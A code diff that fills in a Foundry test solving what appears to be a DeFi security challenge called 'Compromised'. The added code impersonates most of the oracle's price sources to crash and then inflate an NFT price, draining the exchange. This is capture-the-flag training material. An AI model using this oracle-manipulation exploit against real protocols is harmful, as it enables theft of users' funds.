@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,28 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        for (uint256 i = 0; i <= sources.length / 2; i++) {
+            vm.prank(sources[i]);
+            oracle.postPrice(symbols[i], PLAYER_INITIAL_ETH_BALANCE);
+        }
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        for (uint256 i = 0; i <= sources.length / 2; i++) {
+            vm.prank(sources[i]);
+            oracle.postPrice(symbols[i], EXCHANGE_INITIAL_ETH_BALANCE + PLAYER_INITIAL_ETH_BALANCE);
+        }
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        vm.stopPrank();
+
+        for (uint256 i = 0; i <= sources.length / 2; i++) {
+            vm.prank(sources[i]);
+            oracle.postPrice(symbols[i], INITIAL_NFT_PRICE);
+        }
     }
 
     /**
